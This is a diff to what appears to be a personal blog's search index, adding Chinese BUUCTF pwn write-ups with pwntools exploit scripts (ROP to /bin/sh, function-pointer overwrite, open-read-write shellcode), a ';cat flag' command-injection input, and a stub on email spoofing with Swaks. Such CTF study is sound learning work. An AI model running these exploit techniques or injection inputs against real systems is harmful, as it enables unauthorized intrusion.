@@ -7617,6 +7617,96 @@
 <p>不过需要首先将<code>/bin/sh</code>这个字符串写在bss段，由于read直接在符号表中可以找到，可以直接调用</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28409</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./simplerop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x80bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;b&#x27;</span>*<span class="number">32</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(read_plt) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">1</span>) + p32(elf.bss())+ p32(<span class="number">0x8</span>) + p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(elf.bss()) + p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>检查安全机制</p>
+<p><img src="image-20201216182925112.png" alt="image-20201216182925112"></p>
+<p>在vulnerable_function中读了0x100</p>
+<p><img src="image-20201216183411467.png" alt="image-20201216183411467"></p>
+<p>直接ROP做ret2libc</p>
+<p>和level3一模一样，payload都可以一样，代码略</p>
+<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019] Login"></a>[ZJCTF 2019] Login</h2><p>开启了不少保护机制的64位程序</p>
+<p><img src="image-20201216185352364.png" alt="image-20201216185352364"></p>
+<p>运行时要输入一个用户名和密码</p>
+<p><img src="image-20201216185409505.png" alt="image-20201216185409505"></p>
+<p>IDA64看一下</p>
+<p><img src="image-20201216185535560.png" alt="image-20201216185535560"></p>
+<p>应该是C++写的代码，很多都是这样类的方法</p>
+<p>这里头写了admin这个账户名，并且看一下这个类初始化时可以发现密码设置成了v10那个字符串</p>
+<p>输入这个用户名密码之后得到了一个segment fault</p>
+<p><img src="image-20201216195547873.png" alt="image-20201216195547873"></p>
+<p>段错误发生的位置应该是在这个password_checker</p>
+<p><img src="image-20201216201849372.png" alt="image-20201216201849372"></p>
+<p>这里看到直接把a1当函数进行调用了，参数s</p>
+<p>看汇编代码</p>
+<p><img src="image-20201217170835156.png" alt="image-20201217170835156"></p>
+<p>这里实际上是call rax，这里实际上是<code>rbp+var_68</code>这个位置</p>
+<p>a1是我们调用这个password_checker函数时的第一个参数</p>
+<p>因此在调用之前是在rdi中</p>
+<p>往前推发现这个位置</p>
+<p><img src="image-20201218144259104.png" alt="image-20201218144259104"></p>
+<p>动态调试发现这里有将<code>rbp+0x130</code>的值放在rax中，<code>rax</code>又放在<code>rdi</code></p>
+<p>继续往上可以看到<code>[rbp+var_130]</code>这里又是执行完password_checker后rax的值</p>
+<p><img src="image-20201218144542567.png" alt="image-20201218144542567"></p>
+<p>在这个函数内部发现rax的值是<code>[rbp+var_18]</code>这里控制的</p>
+<p><img src="image-20201218144732229.png" alt="image-20201218144732229"></p>
+<p>所以可以尝试将这个地方覆盖成<code>Admin::shell</code>的地址</p>
+<p>在输入的地方，我们输入到的内容是s</p>
+<p><img src="image-20201218145113099.png" alt="image-20201218145113099"></p>
+<p>位置是<code>rbp-60h</code></p>
+<p>要覆盖的地方<code>rbp-18h</code></p>
+<p>计算一下偏移，再去掉原本密码的长度就可以了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25322</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./login&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">admin_shell = <span class="number">0x400e88</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;username:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span></span><br><span class="line">payload += (<span class="number">0x60</span><span class="number">-0x18</span>-len(payload))*<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = bytes(payload,<span class="string">&#x27;ascii&#x27;</span>)  + p64(admin_shell)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>检查安全机制发现是64位程序</p>
+<p><img src="image-20201218150055017.png" alt="image-20201218150055017"></p>
+<p>程序主要是一个循环</p>
+<p><img src="image-20201218153400218.png" alt="image-20201218153400218"></p>
+<p>其中只有前三个case有用，后面几个都没有什么用</p>
+<p>这里发现case1是存在了一个system</p>
+<p>这里可能是我们最后想要利用的地方，dest这个原本是一个字符串</p>
+<p>内容可以用p64来读</p>
+<p><img src="image-20201218154228878.png" alt="image-20201218154228878"></p>
+<p>就是一个ping</p>
+<p>这里有可能是有命令执行的，直接尝试一下，输入<code>;cat flag</code>就成了</p>
+<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>堆题，放一放</p>
+<h2 id="picoctf-2018-bufferoverflow2"><a href="#picoctf-2018-bufferoverflow2" class="headerlink" title="picoctf_2018_bufferoverflow2"></a>picoctf_2018_bufferoverflow2</h2><p>checksec</p>
+<p><img src="image-20201218155541804.png" alt="image-20201218155541804"></p>
+<p>整个题目还是很简单，就是一个简单的溢出，之后返回到win函数就可以</p>
+<p>win函数中有一个判断，判断a1、a2参数是不是对的，正确的话就会输出</p>
+<p><img src="image-20201218155756700.png" alt="image-20201218155756700"></p>
+<p>很简单，就不写脚本了</p>
+<h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h2><p>checksec</p>
+<p><img src="image-20201218160559651.png" alt="image-20201218160559651"></p>
+<p>这个题目也不知道为啥在这么靠后的位置，蛮简单的</p>
+<p><img src="image-20201218160718134.png" alt="image-20201218160718134"></p>
+<p>还给输出了buf的基地址，这是想让直接在栈上写shell</p>
+<p>但是这个程序远程又不是直接给输出的，还必须要send之后才有回复</p>
+<p>所以还是要用rop来做，shellcode直接用level3就可以</p>
+<h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><p>首先checksec</p>
+<p><img src="image-20201218163107558.png" alt="image-20201218163107558"></p>
+<p>看到危险函数就是一个简单的read</p>
+<p>直接返回到后门函数shell就可以</p>
+<p>过于简单，略</p>
+<h2 id="pawnable-orw"><a href="#pawnable-orw" class="headerlink" title="pawnable_orw"></a>pawnable_orw</h2><p>checksec发现是32位</p>
+<p><img src="image-20201218163532756.png" alt="image-20201218163532756"></p>
+<p>直接输入shellcode，然后执行</p>
+<p><img src="image-20201218163625301.png" alt="image-20201218163625301"></p>
+<p>这个题目前面有一个<code>orw_seccomp</code>函数，这个函数内部比较重要</p>
+<p>有一个之前没听过的概念</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.open(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h2><p>checksec发现</p>
+<p><img src="buuctf-pwn1/image-20201218183037735.png" alt="image-20201218183037735"></p>
+<p>main函数</p>
+<p><img src="buuctf-pwn1/image-20201218185132186.png" alt="image-20201218185132186"></p>
+<p>v4这里可以导致溢出</p>
+<p>scanf需要调试着来确定偏移，发现返回地址在偏移24的位置</p>
+<p>之后直接返回到后门函数就可以</p>
 ]]></content>
       <categories>
         <category>buuctf</category>
@@ -7626,5 +7716,14 @@
         <tag>CTF</tag>
         <tag>pwn</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Email-spoofing</title>
+    <url>/2020/12/08/Email-spoofing/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<h2 id="Swaks"><a href="#Swaks" class="headerlink" title="Swaks"></a>Swaks</h2><p>下载地址<a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p>
+<p>最基本的伪造</p>
+]]></content>
   </entry>
 </search>
